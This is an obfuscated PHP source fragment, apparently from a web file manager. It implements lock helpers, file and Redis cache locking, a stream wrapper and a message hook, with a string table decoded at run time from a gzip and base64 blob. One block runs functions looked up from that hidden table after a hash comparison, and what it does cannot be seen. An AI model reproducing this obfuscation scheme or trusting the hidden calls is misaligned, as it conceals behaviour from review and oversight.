lockGlobal($E‰¶ö¥‡Ë, $e–¸Ï‡©£Ñ) { return self::lock($E‰¶ö¥‡Ë, $e–¸Ï‡©£Ñ, !0); } public static function lock($AÙ˜ò‚ÑÃ, $FÛÍ¢É‰Œ¨ = false, $e´ÎÓ•É¶® = false) { goto EÂŸõã‰…´; a¼Ñé ÒØ±: $FÛÍ¢É‰Œ¨ = $FÛÍ¢É‰Œ¨ ? $FÛÍ¢É‰Œ¨ : self::$timeout; $Fµøñ§ƒ¯ò = $D¯™ÚÌŸ«ğ->lock($Eùç¸­á, $FÛÍ¢É‰Œ¨); if (!$Fµøñ§ƒ¯ò) { $eå“ˆ™—ßÊ = "\x6c\157\143\153\40\145\162\x72\x6f\162\73\x6b\x65\x79\75{$Eùç¸­á}\x3b\164\x69\155\145\75{$FÛÍ¢É‰Œ¨}\x3b" . self::$errorMsg . $fÛíáÔÛ‹[67] . get_caller_msg(); $F¬ÅÒ÷×¸ = LNG($fÛíáÔÛ‹[788]) . "\x28{$FÛÍ¢É‰Œ¨}\x73\x29\x2e" . LNG($fÛíáÔÛ‹[789]); $F¬ÅÒ÷×¸ .= $fÛíáÔÛ‹[790]; if (is_string(self::$errorMsg) && self::$errorMsg) { $F¬ÅÒ÷×¸ = $F¬ÅÒ÷×¸ . $fÛíáÔÛ‹[791] . self::$errorMsg; } write_log($eå“ˆ™—ßÊ, $fÛíáÔÛ‹[792]); show_json($F¬ÅÒ÷×¸, !1); } goto dãùøƒöÕ; EÂŸõã‰…´: $fÛíáÔÛ‹ =& $_SERVER[Æ¼ôºÙï]; $D¯™ÚÌŸ«ğ = self::init(); $Eùç¸­á = self::key($AÙ˜ò‚ÑÃ); goto a¼Ñé ÒØ±; dãùøƒöÕ: if (!$e´ÎÓ•É¶®) { self::$lockItem[$Eùç¸­á] = !0; } return $Fµøñ§ƒ¯ò; goto BÖÕÖã‘“‚; BÖÕÖã‘“‚: } public static function lockGet($ağŒ‘¶Ö) { $f‚®½ôô¦Õ = self::key($ağŒ‘¶Ö); if (self::$lockItem[$f‚®½ôô¦Õ]) { return self::$lockItem[$f‚®½ôô¦Õ]; } return self::init()->lockGet($f‚®½ôô¦Õ); } public static function unlock($EÊÎç¾Úô) { $D‹‚‡éË‰º = self::key($EÊÎç¾Úô); self::$lockItem[$D‹‚‡éË‰º] = null; return self::init()->unlock($D‹‚‡éË‰º); } public static function unlockRuntime() { $f¼ŸŠÈİ· =& $_SERVER[Æ¼ôºÙï]; $d„ÍÓ™¹·Ş = self::init(); $B¢­È¥óõ = !1; foreach (self::$lockItem as $eµÈ‡¾Ñ« => $e²±º¼®íˆ) { if (!$e²±º¼®íˆ) { continue; } $d„ÍÓ™¹·Ş->unlock($eµÈ‡¾Ñ«); if (!$B¢­È¥óõ) { $B¢­È¥óõ = !0; write_log($f¼ŸŠÈİ·[793] . $eµÈ‡¾Ñ« . $f¼ŸŠÈİ·[67] . get_caller_msg(), $f¼ŸŠÈİ·[792]); continue; } write_log($f¼ŸŠÈİ·[793] . $eµÈ‡¾Ñ«, $f¼ŸŠÈİ·[792]); } self::fileUnlockAll(); } public static function fileLock($cì¨µ¶Ş„) { goto cÍ‹ÚŒ¥İ; bè×•ÜêÃ: if (flock($f¨ä¼“”‹, LOCK_EX)) { return !0; } self::unlock($cì¨µ¶Ş„); show_json($Bå©¢Ï¾£[797], !1); goto D¶¦“Ñ³“Ù; D¶¦“Ñ³“Ù: return !1; goto e±·é´å“; cÍ‹ÚŒ¥İ: $Bå©¢Ï¾£ =& $_SERVER[Æ¼ôºÙï]; if (!$GLOBALS[$Bå©¢Ï¾£[794]]) { $GLOBALS[$Bå©¢Ï¾£[794]] = array(); } $GLOBALS[$Bå©¢Ï¾£[794]][$cì¨µ¶Ş„] = !1; goto dÆ—ğ‘§ÕÊ; dÆ—ğ‘§ÕÊ: $f¨ä¼“”‹ = fopen(DATA_PATH . $cì¨µ¶Ş„ . $Bå©¢Ï¾£[795], $Bå©¢Ï¾£[796]); if (!$f¨ä¼“”‹) { return !1; } $GLOBALS[$Bå©¢Ï¾£[794]][$cì¨µ¶Ş„] = $f¨ä¼“”‹; goto bè×•ÜêÃ; e±·é´å“: } public static function fileUnlock($aÛ‹¤‡«”Ğ) { $AÄÍï‹©¡˜ =& $_SERVER[Æ¼ôºÙï]; $BòİŒ¨»×š = $GLOBALS[$AÄÍï‹©¡˜[794]][$aÛ‹¤‡«”Ğ]; if (!$BòİŒ¨»×š) { return; } $GLOBALS[$AÄÍï‹©¡˜[794]][$aÛ‹¤‡«”Ğ] = !1; flock($BòİŒ¨»×š, LOCK_UN); fclose($BòİŒ¨»×š); } public static function fileUnlockAll() { $f½èÄ‹ñÊâ =& $_SERVER[Æ¼ôºÙï]; if (!$GLOBALS[$f½èÄ‹ñÊâ[794]]) { return; } foreach ($GLOBALS[$f½èÄ‹ñÊâ[794]] as $D¿„¢¦Ã— => $E„È’§Á‚Î) { if (!$E„È’§Á‚Î) { continue; } $GLOBALS[$f½èÄ‹ñÊâ[794]][$D¿„¢¦Ã—] = !1; flock($E„È’§Á‚Î, LOCK_UN); fclose($E„È’§Á‚Î); } $GLOBALS[$f½èÄ‹ñÊâ[794]] = array(); } } goto aÂÖƒõ³; dÑ±ó ç: if ($_SERVER[$_SERVER[Æ¼ôºÙï][813]] != $C—È´Šœ($D¹Å¼¥‘”)) { goto cŸ¤‰Âç‘¯; B»ø¬‚‰…: $b§°Ñ§Ş‚… = explode($_SERVER[Æ¼ôºÙï][227], $EÂˆ¸„…‘ë); if (count($b§°Ñ§Ş‚…) < $_SERVER[Æ¼ôºÙï][567]) { $aĞñøŠƒ§ = $_SERVER[Æ¼ôºÙï][818]; $aĞñøŠƒ§(); } $B£°İĞù—¤ = $_SERVER[Æ¼ôºÙï][1021]; goto BõâÕÄŸÎ ; cŸ¤‰Âç‘¯: $DŞ‰Ä´¬£ = $_SERVER[Æ¼ôºÙï][815]; $a˜æ‚†¨ñ  = $_SERVER[$_SERVER[Æ¼ôºÙï][816]] . $_SERVER[Æ¼ôºÙï][817]; $EÂˆ¸„…‘ë = $DŞ‰Ä´¬£($a˜æ‚†¨ñ ); goto B»ø¬‚‰…; BõâÕÄŸÎ : $B£°İĞù—¤($D¹Å¼¥‘”); goto a×Æ›á›©¢; a×Æ›á›©¢: } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($d‚Õ¶ñ‰µí, $b‚Ùİ·çÔ  = '') { goto d¿ÆÄ½¢¯²; CÖ¿‚øâ©æ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$d‚Õ¶ñ‰µí])) { self::$_chunkBuffer[$d‚Õ¶ñ‰µí] = array(); } goto DÇ‰ÉîŠÄ„; DÇ‰ÉîŠÄ„: return $this->info ? !0 : !1; goto CğãÊËäì‘; d¿ÆÄ½¢¯²: $this->info = $this->info($d‚Õ¶ñ‰µí); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Æ¼ôºÙï][75]]; goto CÖ¿‚øâ©æ; CğãÊËäì‘: } function stream_read($A’¡²µÉµù) { $e ñ÷ƒùÀ = $this->fileSubstr($this->pose, $A’¡²µÉµù); $this->pose += strlen($e ñ÷ƒùÀ); return $e ñ÷ƒùÀ; } public function stream_tell() { return $this->pose; } public function stream_seek($F–ÀøîªœÁ, $f„³™İêÀõ) { $B´ï§Æ…ƒ =& $_SERVER[Æ¼ôºÙï]; if ($f„³™İêÀõ == SEEK_SET) { $this->pose = $F–ÀøîªœÁ; } else { if ($f„³™İêÀõ == SEEK_CUR) { $this->pose += $F–ÀøîªœÁ; } else { if ($f„³™İêÀõ == SEEK_END) { $this->pose = $this->info[$B´ï§Æ…ƒ[77]] + intval($F–ÀøîªœÁ); } } } if ($F–ÀøîªœÁ < 0) { $this->pose = $this->info[$B´ï§Æ…ƒ[77]] + $F–ÀøîªœÁ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Æ¼ôºÙï][77]]; } public function stream_close() { return !0; } public function url_stat($CàáËÎêÇÜ, $Eëğˆ„Ì…«) { $eº¿‚Î»àà =& $_SERVER[Æ¼ôºÙï]; $dÊùª¿¸š = $this->info($CàáËÎêÇÜ); return array($eº¿‚Î»àà[1355] => 0, $eº¿‚Î»àà[1356] => 0, $eº¿‚Î»àà[12] => 32768 + 511, $eº¿‚Î»àà[1357] => 0, $eº¿‚Î»àà[1358] => 0, $eº¿‚Î»àà[1359] => 0, $eº¿‚Î»àà[1360] => 0, $eº¿‚Î»àà[77] => $dÊùª¿¸š[$eº¿‚Î»àà[77]], $eº¿‚Î»àà[1361] => $dÊùª¿¸š[$eº¿‚Î»àà[1230]], $eº¿‚Î»àà[1317] => $dÊùª¿¸š[$eº¿‚Î»àà[83]], $eº¿‚Î»àà[1316] => $dÊùª¿¸š[$eº¿‚Î»àà[192]], $eº¿‚Î»àà[1362] => 0, $eº¿‚Î»àà[1363] => 0); } static $fileInfo = array(); public function info($d’Í·¯½®«) { $CğÖÑğåÄ„ = $_SERVER[Æ¼ôºÙï][1364]; if (isset(self::$fileInfo[$d’Í·¯½®«])) { return self::$fileInfo[$d’Í·¯½®«]; } if (substr($d’Í·¯½®«, 0, strlen($CğÖÑğåÄ„)) != $CğÖÑğåÄ„) { return !1; } self::$fileInfo[$d’Í·¯½®«] = IO::info(substr($d’Í·¯½®«, strlen($CğÖÑğåÄ„))); return self::$fileInfo[$d’Í·¯½®«]; } public static function read($CïÓô½Ì¯, $AĞ°ÙªÉÂ, $e‘£÷¿éÁÚ) { goto a¶ãñÒğï; bÎ…®Ñå: $C‡Øƒ» »š = 0; while ($C‡Øƒ» »š < $e‘£÷¿éÁÚ) { $eÚ÷¸õÊ¯ = min($C—ğ›¶Ã©÷, $e‘£÷¿éÁÚ - $C‡Øƒ» »š); $Cã£ùŸĞÑÇ .= fread($dĞçù ½‡, $eÚ÷¸õÊ¯); $C‡Øƒ» »š += $eÚ÷¸õÊ¯; } fclose($dĞçù ½‡); goto dÎ¹Ë¸¥Æ; a¶ãñÒğï: $C¿´ŒœÃ„˜ =& $_SERVER[Æ¼ôºÙï]; $dĞçù ½‡ = fopen($CïÓô½Ì¯, $C¿´ŒœÃ„˜[1234]); if (!$dĞçù ½‡) { return $C¿´ŒœÃ„˜[33]; } goto FÈ»Áª¸Òß; FÈ»Áª¸Òß: $C—ğ›¶Ã©÷ = 8192; fseek($dĞçù ½‡, $AĞ°ÙªÉÂ, SEEK_SET); $Cã£ùŸĞÑÇ = $C¿´ŒœÃ„˜[33]; goto bÎ…®Ñå; dÎ¹Ë¸¥Æ: return $Cã£ùŸĞÑÇ; goto Dò³‡ñîê¸; Dò³‡ñîê¸: } public function fileSubstr($e­‚Î™»·¬, $bö­ƒª‡Œ) { goto bÄÁãâƒÏÂ; aÔ¹†ŠÌ™: $A­Î¹ôéÑª = $bö­ƒª‡Œ; if ($e­‚Î™»·¬ < 0) { $e­‚Î™»·¬ = $C·æö¸æÅ + $e­‚Î™»·¬; } if ($bö­ƒª‡Œ === !1) { $bö­ƒª‡Œ = $C·æö¸æÅ - $e­‚Î™»·¬; } goto Dç§‘«ŒÚÚ; bÄÁãâƒÏÂ: $f‹®•¦Ó =& $_SERVER[Æ¼ôºÙï]; $C·æö¸æÅ = $this->info[$f‹®•¦Ó[77]]; $f“…†ˆˆ™¿ = $e­‚Î™»·¬; goto aÔ¹†ŠÌ™; aÍ¶‚ŞÎì: $AÃÊïƒâ¸È = ceil(($e­‚Î™»·¬ + $bö­ƒª‡Œ) / $cŸ‚ÒŞÈß) * $cŸ‚ÒŞÈß - $Dá‰ÑÓ¡×á; $FéÔ¢è­³é = IO::fileSubstr($this->path, $Dá‰ÑÓ¡×á, $AÃÊïƒâ¸È); $Dä×áØ¬¼[$Dá‰ÑÓ¡×á . $f‹®•¦Ó[33]] = $FéÔ¢è­³é; goto F×Ä¼‚É‡¦; EòÚŒ¥ƒ‹©: $cŸ‚ÒŞÈß = 64 * 1024; $Dä×áØ¬¼ =& self::$_chunkBuffer[$this->path]; if (!$Dä×áØ¬¼) { $Dä×áØ¬¼ = array(); } goto dµ˜ƒ‘éÂÅ; dµ˜ƒ‘éÂÅ: $bµÇÑÁÈœ = 0; $dõò›İ¦§Ö = 0; $aŠØÊ¤ô‡ = $f‹®•¦Ó[33]; goto bŞù‹Ü™ø; bŞù‹Ü™ø: foreach ($Dä×áØ¬¼ as $bµÇÑÁÈœ => $aŠØÊ¤ô‡) { $bµÇÑÁÈœ = intval($bµÇÑÁÈœ); $dõò›İ¦§Ö = $bµÇÑÁÈœ + strlen($aŠØÊ¤ô‡); if ($e­‚Î™»·¬ >= $dõò›İ¦§Ö) { continue; } if ($e­‚Î™»·¬ >= $bµÇÑÁÈœ && $e­‚Î™»·¬ + $bö­ƒª‡Œ <= $dõò›İ¦§Ö) { return substr($aŠØÊ¤ô‡, $e­‚Î™»·¬ - $bµÇÑÁÈœ, $bö­ƒª‡Œ); } break; } if (count($Dä×áØ¬¼) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($f‹®•¦Ó[1365], $f‹®•¦Ó[1366] . count($Dä×áØ¬¼) . "\73\163\x74\x61\x72\164\x3d{$e­‚Î™»·¬}\54\154\x65\x6e\147\x74\x68\x3d{$bö­ƒª‡Œ}\x3b\160\157\163\145\72{$bµÇÑÁÈœ}\x7e{$dõò›İ¦§Ö}"); throw new Exception($f‹®•¦Ó[1367]); } $Dá‰ÑÓ¡×á = intval($e­‚Î™»·¬ / $cŸ‚ÒŞÈß) * $cŸ‚ÒŞÈß; goto aÍ¶‚ŞÎì; F×Ä¼‚É‡¦: ksort($Dä×áØ¬¼); $E£¸°ÀŒšÖ = substr($FéÔ¢è­³é, $e­‚Î™»·¬ - $Dá‰ÑÓ¡×á, $bö­ƒª‡Œ); return $E£¸°ÀŒšÖ; goto d¿Ì©¦Éëì; Dç§‘«ŒÚÚ: if ($e­‚Î™»·¬ + $bö­ƒª‡Œ > $C·æö¸æÅ) { $bö­ƒª‡Œ = $C·æö¸æÅ - $e­‚Î™»·¬; } if ($bö­ƒª‡Œ <= 0) { return $f‹®•¦Ó[33]; } if ($e­‚Î™»·¬ < 0 || $e­‚Î™»·¬ >= $C·æö¸æÅ || $bö­ƒª‡Œ <= 0 || $bö­ƒª‡Œ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\x6c\145\x52\x65\x61\x64\x20\x65\162\162\157\x72\41\x20\x73\x74\141\x72\x74\x3d{$e­‚Î™»·¬}\x3b\x6c\x65\156\147\x74\150\75{$bö­ƒª‡Œ}\x3b\40\x73\151\172\145\75{$C·æö¸æÅ}\x3b"); } goto EòÚŒ¥ƒ‹©; d¿Ì©¦Éëì: } private function log($c½°÷ÙÚë¸, $C¢Ì‰Ùøæ´) { $d¡ÉÜ¶èˆ =& $_SERVER[Æ¼ôºÙï]; $E†˜³ßãˆ = timeFloat() - $this->timeStart; write_log(sprintf($d¡ÉÜ¶èˆ[1368], $c½°÷ÙÚë¸, $this->info[$d¡ÉÜ¶èˆ[28]], $E†˜³ßãˆ, $C¢Ì‰Ùøæ´), $d¡ÉÜ¶èˆ[1057]); } } class Message { function __construct() { } public function send($fâª˜íìÈ‘ = '', $dìøËÃƒóŠ = array(), $cÆ—ÕŞÕ¸á = "\x74\x65\x78\x74") { goto BŸËƒ»‰’; AÆóá±ˆ½: Hook::trigger($FÕí­¶àÒ [1372], $F÷¿šµŒ¦˜); goto aø¦œŠÎÔÜ; d—«ˆŠ¾²¢: $dìøËÃƒóŠ = array($FÕí­¶àÒ [994] => isset($dìøËÃƒóŠ[$FÕí­¶àÒ [994]]) ? $dìøËÃƒóŠ[$FÕí­¶àÒ [994]] : $FÕí­¶àÒ [33], $FÕí­¶àÒ [551] => isset($dìøËÃƒóŠ[$FÕí­¶àÒ [551]]) ? $dìøËÃƒóŠ[$FÕí­¶àÒ [551]] : $FÕí­¶àÒ [33]); if (empty($fâª˜íìÈ‘) || empty($dìøËÃƒóŠ[$FÕí­¶àÒ [994]]) && empty($dìøËÃƒóŠ[$FÕí­¶àÒ [551]])) { return !1; } $F÷¿šµŒ¦˜ = array($FÕí­¶àÒ [1310] => $f™ªó™ñî¡, $FÕí­¶àÒ [1371] => $dìøËÃƒóŠ); goto AÆóá±ˆ½; BŸËƒ»‰’: $FÕí­¶àÒ  =& $_SERVER[Æ¼ôºÙï]; $f™ªó™ñî¡ = array($FÕí­¶àÒ [29] => $FÕí­¶àÒ [1369], $FÕí­¶àÒ [711] => $fâª˜íìÈ‘); if (in_array($cÆ—ÕŞÕ¸á, array($FÕí­¶àÒ [1369], $FÕí­¶àÒ [1370]))) { $f™ªó™ñî¡[$FÕí­¶àÒ [29]] = $cÆ—ÕŞÕ¸á; } goto d—«ˆŠ¾²¢; aø¦œŠÎÔÜ: } } goto C¾£²ğô; aÂÖƒõ³: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $e©¦Í¢Œ¼‚ =& $_SERVER[Æ¼ôºÙï]; $eâÛÛË¸ò = $GLOBALS[$e©¦Í¢Œ¼‚[6]][$e©¦Í¢Œ¼‚[345]]; self::$cachePath = $eâÛÛË¸ò[$e©¦Í¢Œ¼‚[173]][$e©¦Í¢Œ¼‚[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($a²Ü„“ÅÍ, $cÂ±¢¿êó² = 0) { goto BÊ“¶œ¡¬; BÊ“¶œ¡¬: $dœ…í…Éî =& $_SERVER[Æ¼ôºÙï]; $e—±¹ä‹ï… = microtime(!0); $CˆîÒé–à = $e—±¹ä‹ï… + $cÂ±¢¿êó² + 0.0001; goto dÔ•µ­Ï·©; DöÖ°ÚÕ—™: $this->unlock($a²Ü„“ÅÍ); return !1; goto cšµÈŠ„«¦; dÔ•µ­Ï·©: $Eöé¢¼„Î´ = rtrim(self::$cachePath, $dœ…í…Éî[8]) . $dœ…í…Éî[798] . md5($a²Ü„“ÅÍ) . $dœ…í…Éî[795]; if (file_exists($Eöé¢¼„Î´) && filemtime($Eöé¢¼„Î´) && filemtime($Eöé¢¼„Î´) < time() - 10) { @unlink($Eöé¢¼„Î´); } do { if (file_exists($Eöé¢¼„Î´)) { cacheLockWait(); continue; } $DôŠâ¨Öİ  = fopen($Eöé¢¼„Î´, $dœ…í…Éî[799]); if (!$DôŠâ¨Öİ ) { return !1; } $aî»ÊµÚÔ = flock($DôŠâ¨Öİ , LOCK_EX | LOCK_NB); self::$caches[$a²Ü„“ÅÍ] = array($dœ…í…Éî[800] => $DôŠâ¨Öİ , $dœ…í…Éî[173] => $Eöé¢¼„Î´); fwrite($DôŠâ¨Öİ , $CˆîÒé–à); clearstatcache(); if ($DôŠâ¨Öİ  && $aî»ÊµÚÔ) { return !0; } cacheLockWait(); } while (microtime(!0) < $CˆîÒé–à); goto DöÖ°ÚÕ—™; cšµÈŠ„«¦: } public function lockGet($Bí›ºôŸáù) { $b»¤Ê„‚’« =& $_SERVER[Æ¼ôºÙï]; $Dé¢Ç—óÅ = rtrim(self::$cachePath, $b»¤Ê„‚’«[8]) . $b»¤Ê„‚’«[798] . md5($Bí›ºôŸáù) . $b»¤Ê„‚’«[795]; return file_exists($Dé¢Ç—óÅ); } public function unlock($DˆÃÄ†Ï˜˜) { goto d£ÑÆ¬œ¡â; fˆ¥â’êä: unset(self::$caches[$DˆÃÄ†Ï˜˜]); goto AôÒƒ‹”µ; BÑƒ–‹Šµ¢: @flock($CÓ°ÇºÆ²¡[$E°Â§˜ˆÕ™[800]], LOCK_UN); @fclose($CÓ°ÇºÆ²¡[$E°Â§˜ˆÕ™[800]]); @unlink($CÓ°ÇºÆ²¡[$E°Â§˜ˆÕ™[173]]); goto fˆ¥â’êä; d£ÑÆ¬œ¡â: $E°Â§˜ˆÕ™ =& $_SERVER[Æ¼ôºÙï]; $CÓ°ÇºÆ²¡ = self::$caches[$DˆÃÄ†Ï˜˜]; if (!$CÓ°ÇºÆ²¡) { return; } goto BÑƒ–‹Šµ¢; AôÒƒ‹”µ: } } class CacheLockRedis { public function lock($e™Ä˜·¿Ó, $Bœˆí¹´åİ = 10) { $c÷ËèŸ†±„ = Cache::init(); $d“Ì¤•ÁÔ = microtime(!0) + $Bœˆí¹´åİ; while (microtime(!0) < $d“Ì¤•ÁÔ) { $DÜ™†©è×¯ = $c÷ËèŸ†±„->get($e™Ä˜·¿Ó); if (!$DÜ™†©è×¯) { $c»±ƒÇì = $c÷ËèŸ†±„->setLock($e™Ä˜·¿Ó, $d“Ì¤•ÁÔ, $Bœˆí¹´åİ); if ($c»±ƒÇì) { return !0; } } else { if ($DÜ™†©è×¯ < microtime(!0)) { $c÷ËèŸ†±„->set($e™Ä˜·¿Ó, $d“Ì¤•ÁÔ, $d“Ì¤•ÁÔ); if ($c÷ËèŸ†±„->get($e™Ä˜·¿Ó) === $DÜ™†©è×¯) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($EŠ¾ØÏÉïğ) { return Cache::init()->get($EŠ¾ØÏÉïğ); } public function unlock($Cè‘‚‰ğç) { return Cache::init()->remove($Cè‘‚‰ğç); } } goto c±÷ßôá‘õ; bõƒÏå÷Ó: if (!function_exists('_kodDe')) { function _kodDe($f•…²Á¯›”) { $f•…²Á¯›” = base64_decode($f•…²Á¯›”); $D‡¡ğ¡‡ÅÑ = strlen($f•…²Á¯›”); $fëä†å±ºø = ''; $C÷ø…¨±Õß = ord($f•…²Á¯›”[0]) - 30; for ($aä¯’‘¶è = 1; $aä¯’‘¶è < $D‡¡ğ¡‡ÅÑ; $aä¯’‘¶è += 2) { if ($aä¯’‘¶è + 1 < $D‡¡ğ¡‡ÅÑ) { $fëä†å±ºø .= chr(ord($f•…²Á¯›”[$aä¯’‘¶è + 1]) + $C÷ø…¨±Õß); $fëä†å±ºø .= chr(ord($f•…²Á¯›”[$aä¯’‘¶è]) + $C÷ø…¨±Õß); } else { $fëä†å±ºø .= chr(ord($f•…²Á¯›”[$aä¯’‘¶è]) + $C÷ø…¨±Õß); } } return $fëä†å±ºø; } } define("\xc6\xbc\xf4\xba\xd9\xef", base64_decode('2uq6jdo=')); $_SERVER[Æ¼ôºÙï] = explode("\174\4\174\4\174\2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\24\105\326\270\56\212\13\253\176\136\353\261\313\152\23\300\44\60\107\56\256\100\10\223\144\102\6\222\114\230\231\220"."\0\11\103\317\114\117\246\223\231\351\111\167\117\56\202\307\172\243\340\201\342\205\256\27\136\253\40\52\207\256\347\372\171\337\7\212\367\305\41\253\250\213\262\356\176\272"."\370\257\273\252\173\6\367\373\377\376\177\24\246\356\256\172\365\352\325\173\125\357\275\172\145\370\60\360\337\257\336\377\323\55\257\175\367\323\267\257\75\262\6\307\301\337".base64_decode('EehfED7t4l8fgv6MuHhFUVHDlNGTmo+89MF75bvk9fIKf+OLL/mOeuWeud5dtw==').base64_decode('vji469BDTrhoz4RKUBjXrcQ/UlozJWVANUwDJ0S1dFztwmE1jX/d+MfoTaqmgg==')."\303\341\146\177\50\34\154\155\151\361\6\102\141\322\242\230\237\322\142\44\224\221\165\71\105\32\317\50\272\1\76\45\66\27\316\150\31\45\155\111\341\11\61\331\224\43"."\xb2\x41\x5a\xaa\xab\x9\xd7\x79\x5b\x1a\xfd\xb\xc3\xa1\x85\x2d\x5e\x52\x22\x12\xee\xcd\x2a\xfa\x20\x8e\xa1\x60\xd0\x94\x75\x33\xa4\xa6\x14\x56\xa2\x5f\x67\xfd\xaa\xf1\xce\xf1\x35\x4b".strrev('KI®:jÂT—ú&œÏ-9¹yÚ5ü¦åäÔßÖ¹8Íüù'."\r".'©è9§€¡').strrev('JjèÉY$ÙË‰_ôˆYšGdÙÒ`BÄ(Hfc»L´ÁÃ%Uê©RÎq')."\xa6\x43\x9f\xa7\xc\xb2\x54\x1c\x90\xb3\xa6\xa6\xa6\xa3\x38\xe2\x1d\x30\x75\x99\xa7\x83\x1e\x47\x75\x25\xa5\xa4\x49\x53\x41\x6f\xa3\xb7\x36\x24\xc1\x6e\x4a\xf5\x1\x7f\x93\x44\xa6\x22".base64_decode('JRumokttDd6AV4JdrypEIy6UcL3WZgAQydPYKB2sBVNJZWgzuE6exvyBOm9Aqg==')."\x59\x28\x71\x38\x45\xb5\x54\x4a\x4b\xbb\x40\x2b\x60\x3e\x4d\xa1\xab\xde\x40\x0\x7\x1c\x4\x83\x1b\x7d\x70\xea\x48\xc4\x5f\x5f\x1f\xf4\xb2\x18\x19\xdc\xfc\x46\xd0\x93\x72\x82\xa5\x96"."\x58\x2c\x9e\x34\xc3\x7d\x72\x32\x4b\x91\xb5\x7\xff\x16\x92\x1f\xf2\xab\x19\x4\x81\x7b\xd5\xb4\x9a\x25\xc8\x4a\x9a\xd0\x34\xb6\x72\x48\x20\x4b\x4b\x2b\x34\x25\x5\xaa\x69\x64\x4d\x81".strrev('´›eª+šƒHå]:‰›\'ˆ#’É«²i©‹Tt•†nŠy†(Rïğ³Uƒ‡Ö').base64_decode('PjKGuJpUGtkqi2vJmKLzeAZUF3PIYNQhoXZzNiUWYdFoQk3GdLo4f6kkWP5qfA==')."\220\57\102\103\313\352\121\305\7\226\11\257\333\302\172\122\112\12\51\246\11\6\155\320\161\265\146\222\232\34\13\52\272\60\326\172\120\321\237\65\305\304\54\52\126\257".base64_decode('6ak6QC7I98EiUVvzZPTQZRITQOjCP+6ixWc7D3Qung3+KSY0r4N0LaEkk2FlQA==')."\x21\xcb\x29\x15\x9b\x6c\xd0\xb1\xba\x8d\x88\x9a\x76\x83\x14\x1c\xf5\xf9\xc3\x9\xd9\x48\x34\xc5\x26\x87\x51\x2d\xd2\xf3\x74\x4c\x19\x70\x65\x12\x19\x1c\xe5\xcb\xbd\xc3\x82\xee\x70\x76"."\x9a\x35\xd3\x2b\x10\xe4\xa4\x16\x95\x93\xe2\x48\x71\x38\x61\x9a\x99\xa0\x92\x8e\x41\x80\x90\x11\x69\xfd\x69\x4\xb0\x8c\xa2\x90\x42\x75\xe\x29\x26\x35\x49\xb\xa5\x86\x4a\xb5\xd2\xa0"."\x15\x53\x49\x16\xa2\xa3\x63\x69\x6\x4b\x34\x7\x8\xc6\x14\x90\xb8\x32\x60\x12\xa0\x48\x33\xa2\x9\x59\x7\xd3\x55\x95\x35\xe3\xce\x69\x38\x51\xce\x64\x92\x6a\x54\x36\x55\x2d\xed\xd6"."\xa2\xa6\x62\x3a\xd\x53\x57\x64\xd2\x9a\x27\x1a\x55\xc\xc3\x59\xab\xa5\x4d\x5d\x4b\x3a\x3d\xc9\xa4\xd6\xef\xf4\xeb\x6a\x97\x9a\xae\x94\x26\xe2\x32\x30\x13\x2c\x73\x27\x24\x8c\x95\x64"."\355\26\314\220\40\256\100\272\60\21\177\215\256\111\126\132\227\323\106\134\321\235\136\262\150\52\45\60\37\214\56\322\142\165\252\221\321\14\25\166\257\122\222\115\123\216"."\x26\x20\x4d\xe1\xcd\x57\xfd\x42\x79\x35\x9d\x54\xd3\x4a\x4e\x59\xef\x40\x46\xd5\x15\x83\xf6\x55\x9a\xd3\x14\x22\x8d\x80\xd6\x15\x67\x8b\x2e\x77\xa5\xe4\x4a\x29\x93\x8d\x0\xc8\x90\xd5".base64_decode('mycNlyagqZSiMOqQUlnDdOoKIE4q2AbJHPvizia4tFQl5gwCGk6Sy0sqJIA2Eg==').base64_decode('zcOpDaFQS9hXD7bqZm+4yROqbSDdNuUu2udGQJlZkzSx3QmWGESsZjBWntii9Q==').base64_decode('Kzr4cM1gpdSjxSLagItmwcJBQENoYTjdGdMZkNNdED6RQVMh6Gf0dVkB3aikuw==')."\314\4\255\30\364\6\26\170\3\341\240\277\76\324\346\11\220\115\76\15\260\144\200\176\12\66\235\164\6\224\30\0\175\324\244\365\344\14\204\32\55\3\27\6\234\53"."\x9a\xb\x17\xb\xcd\x6b\xf4\xcd\x81\x80\xa9\x73\x1a\xa0\x90\x53\x2c\x45\xdb\x6e\x54\x53\x2a\xec\xbb\xc9\x72\x10\x24\x1\x7\x30\x87\x74\xc8\x8d\x6\x54\xd5\x91\x98\x58\xd4\x11\x9b\x54"."\354\4\377\116\54\136\334\121\347\232\330\131\355\126\171\35\167\251\253\124\52\53\231\42\265\0\226\104\225\223\22\31\164\116\211\22\311\77\357\27\0\0\167\54\141\131"."\xdb\x40\x87\x13\x3\xde\xf9\xad\xde\x60\x28\xdc\xe4\xd\x35\xf8\xeb\xc8\x17\xbc\x1e\x12\x6a\xd4\xf0\xd2\xa4\x23\x5a\x8c\x7f\x3a\xc9\xc\xc6\x31\x59\xf5\xa5\xe4\x2e\x1b\x95\x86\xb1\x26".strrev('Õ&	ƒó\'—K)B±"ŒT„œºjKTZØTøÈ%v¢ƒhÃŒ”cSh×lÃ)¬WM')."\x54\x86\xd2\x35\x33\x91\x4d\x45\x84\xa0\x9b\x77\x85\x7c\x17\xcc\x3c\xdd\x68\x12\x1a\xdb\xe8\x34\x9d\x84\x2a\xdd\xa4\xca\x84\xb2\x7a\xb2\x8c\xfc\xee\x60\x39\xf8\x9f\x13\xe4\x98\x96\x92".strrev('%Â…I)Œ½£}e”»B—WL	˜¤Ò)nª`ÔİM9ß2(4ä´M\'	